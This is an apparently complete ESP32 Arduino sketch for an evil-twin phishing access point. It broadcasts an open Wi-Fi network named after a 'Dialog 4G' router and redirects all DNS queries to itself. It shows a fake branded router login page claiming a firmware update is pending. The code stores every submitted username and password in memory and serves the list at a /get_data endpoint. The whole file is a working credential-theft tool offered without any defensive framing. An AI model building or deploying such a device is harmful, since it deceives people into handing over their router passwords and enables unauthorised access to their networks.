#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <vector>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

struct Form{
  String userName;
  String password;
};

std::vector<Form> dataList;


void handle_root(){
  String _html = R"rawliteral(
<!DOCTYPE html><html lang='en'><head><meta charset="UTF-8"><title>Router Login</title><style>body{margin:0;font-family:Arial,sans-serif;background:#e5e9ee}.topbar{background:#3b4a59;color:#fff;padding:12px 20px;font-size:15px;display:flex;gap:25px}.topbar a{color:#fff;text-decoration:none;opacity:.8}.topbar a:hover{opacity:1}.main-title{text-align:center;margin-top:60px;padding:0 10px}.main-title h2{margin:0;font-size:2rem;font-weight:700}.main-title p{font-size:1.2rem;color:#555;margin-top:6px}.login-box{width:360px;max-width:90%;background:#fff;padding:25px;border-radius:4px;box-shadow:0 0 12px rgba(0,0,0,.2);position:absolute;top:55%;left:50%;transform:translate(-50%,-50%)}label{font-size:14px;color:#444}input{width:100%;padding:8px;margin:4px 0 15px;border:1px solid #ccc;border-radius:3px}.buttons{display:flex;gap:10px;justify-content:flex-end}.btn{padding:8px 18px;border:0;border-radius:3px;cursor:pointer}.btn-login{background:#ee232b;color:#fff}.btn-cancel{background:#ccc}</style></head><body><div class="topbar"><a href="#">Status</a><a href="#">Update</a><a href="#">Settings</a></div><div class="main-title"><h2><span style="color:#ee232b"><span style="font-size:120%">D</span>ialog</span></h2><p>A firmware update is available. Please log in to proceed.</p></div><div class="login-box"><h2>Log In</h2><form method="POST" action="/submit"><label>Username</label><input name="username" type="text" placeholder="Enter username"><label>Password</label><input name="password" type="password" placeholder="Enter password"><a href="#" style="font-size:13px;color:#ee232b;">Forgot password</a><div class="buttons"><button class="btn btn-login" type="submit">Log In</button><button class="btn btn-cancel" type="button">Cancel</button></div></form></div></body></html>
)rawliteral";
  server.send(200, "text/html", _html);
}

void handle_login_submit(){
  if(server.hasArg("username") && server.hasArg("password")){
    Form res;
    res.userName = server.arg("username");
    res.password = server.arg("password");

    dataList.push_back(res);
    
    // redirect to /
    server.sendHeader("Location", "/");
    server.send(303);
  }else{
    // redirect to /
    server.sendHeader("Location", "/");
    server.send(303);
  }
}

void handle_get_data() {
  String json = "[";
  for (size_t i = 0; i < dataList.size(); i++) {
    json += "{\"username\":\"" + dataList[i].userName + "\",\"password\":\"" + dataList[i].password + "\"}";
    if (i < dataList.size() - 1) json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}


void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("Dialog 4G 965", "");
  delay(1000);

  IPAddress ip = WiFi.softAPIP();
  Serial.println("[+] IP Address: "+ip.toString());


  // req(*) -> redirect: IP
  dnsServer.start(DNS_PORT, "*", ip);

  server.on("/", handle_root);
  server.on("/submit", HTTP_POST, handle_login_submit);
  server.on("/get_data", HTTP_GET,handle_get_data);
  server.onNotFound(handle_root);

  server.begin();
  Serial.println("[+] Server is ready!");

}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
